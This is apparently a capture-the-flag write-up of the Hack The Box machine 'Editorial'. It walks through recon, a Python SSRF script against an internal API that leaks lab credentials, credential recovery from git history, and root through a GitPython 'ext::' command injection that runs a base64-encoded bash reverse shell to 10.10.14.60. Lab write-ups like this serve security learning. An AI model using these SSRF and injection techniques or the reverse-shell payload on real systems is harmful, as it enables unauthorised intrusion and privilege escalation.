---
title: Editorial
tags:
  - Linux
  - Fuzzing
  - Python-Scripting
  - Git
---
![](Pasted%20image%2020240901150640.png)

## Reconnaissance

First, I added the new hosts to my known ones:

```shell
sudo echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts
```

After that, I performed an Nmap scan:

```shell
nmap -sC -T4 -p- editorial.htb > sC.txt
 
[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http
|_http-title: Editorial Tiempo Arriba
```

So I took a look at the webpage:

![](Pasted%20image%2020240901150852.png)

After some inspection, I decided to perform a subdomain scan with [Ffuf 🐳](/notes/tools/Ffuf.md), but I didn't find anything, so I performed a [dirsearch 📁](/notes/tools/dirsearch.md) scan:

```shell
dirsearch -u http://editorial.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[redacted]
[15:11:18] 200 -    3KB - /about                                            
[15:11:19] 200 -    7KB - /upload
```

> The `/upload` sounds interesting :3. Let's inspect it:

![](Pasted%20image%2020240901151316.png)

## Exploitation

It seems kinda form submission. Let's try to upload a picture and capture the request with [BurpSuite 📙](/notes/tools/BurpSuite.md):

- If you try to preview the image with the URL related to the book set as `127.0.0.1`, the image shown is the default image:

![](Pasted%20image%2020240901154557.png)

![](Pasted%20image%2020240901154609.png)

We can try to check for SSRF capturing the POST request and then fuzzing it with [Ffuf 🐳](/notes/tools/Ffuf.md):

![](Pasted%20image%2020240901160724.png)

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/Infrastructure/common-http-ports.txt:FUZZ -u http://editorial.htb/upload-cover -request post.req -fs 61

[redacted]
5000           [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 93ms]
```

Now we can check what does this target:

![](Pasted%20image%2020240901161041.png)

We've just obtained info related to some service in `127.0.0.1:5000`. I crafted a small script to make easier the ssrf:

```python
import requests
import sys
import json

POST_TARGET = "http://editorial.htb/upload-cover"
GET_TARGET = "http://editorial.htb/"

HEADERS = {"Host": "editorial.htb",
          "Content-Length": "307",
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypAISdQrbltAeHDXW",
          "Accept": "*/*",
          "Sec-GPC": "1",
          "Accept-Language": "en-US,en;q=0.6",
          "Origin": "http://editorial.htb",
          "Referer": "http://editorial.htb/upload",
          "Accept-Encoding": "gzip, deflate, br",
          "Connection": "close"}

POST_DATA = f"""------WebKitFormBoundarypAISdQrbltAeHDXW
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:5000{sys.argv[1]}
------WebKitFormBoundarypAISdQrbltAeHDXW
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarypAISdQrbltAeHDXW--"""

post_result = requests.post(POST_TARGET, headers=HEADERS, data=POST_DATA)
get_result = requests.get(GET_TARGET+post_result.text)
print(json.loads(get_result.text))
```

If we run it like: 

```shell
python3 expoloit.py /

{'messages': [{'promotions': {'description': 'Retrieve a list of all the promotions in our library.', 'endpoint': '/api/latest/metadata/messages/promos', 'methods': 'GET'}}, {'coupons': {'description': 'Retrieve the list of coupons to use in our library.', 'endpoint': '/api/latest/metadata/messages/coupons', 'methods': 'GET'}}, {'new_authors': {'description': 'Retrieve the welcome message sended to our new authors.', 'endpoint': '/api/latest/metadata/messages/authors', 'methods': 'GET'}}, {'platform_use': {'description': 'Retrieve examples of how to use the platform.', 'endpoint': '/api/latest/metadata/messages/how_to_use_platform', 'methods': 'GET'}}], 'version': [{'changelog': {'description': 'Retrieve a list of all the versions and updates of the api.', 'endpoint': '/api/latest/metadata/changelog', 'methods': 'GET'}}, {'latest': {'description': 'Retrieve the last version of api.', 'endpoint': '/api/latest/metadata', 'methods': 'GET'}}]}
```

We can see that there are some endpoints. If we inspect the `api/latest/metadata/messages/authors` endpoint, we obtain this:

```shell
python3 exploit.py /api/latest/metadata/messages/authors

{'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

> We've got credentials!: `dev:dev080217_devAPI!@`. We obtained user flag also :D

![](Pasted%20image%2020240901163200.png)

## Privilege Escalation

We first upload linpeas to the machine, and run it. Nothing is clearly a PE, so I decided to take a look at the `apss` directory. Inside of it there is a git configuration. So we can do the following:

```shell
git log #to see the previous commits done
```

![](Pasted%20image%2020240901164410.png)

There is one of them quite interesting which is `downgrading prod to dev`, so we can show more specific data of that commit using:

```shell
git show [commit_hash]

git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae

[redacted]
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
```

And there it is, we've got prod's creds: `prod:080217_Producti0n_2023!@`.

Once changed the user:

```shell
sudo -l

[redacted]
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

If we analyze the file:

![](Pasted%20image%2020240901165240.png)

I searched the internet for CVE related to git library and found [https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

As it affects versions `[0, 3.1.30]`, I checked the current version in use:

```shell
pip3 list | grep -i git
gitdb                 4.0.10
GitPython             3.1.29
```

So we can exploit this vulnerability :D

I created a `exploit.sh` with the following content:

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MC82NjYgMD4mMQ== | base64 -d | bash

# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MC82NjYgMD4mMQ== is a simple reverse shell
```

I set up a nc listener, an then I executed the following:

```shell
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh /tmp/exploit.sh'
```

> We are root now, and we've got the root flag :D

![](Pasted%20image%2020240901171120.png)



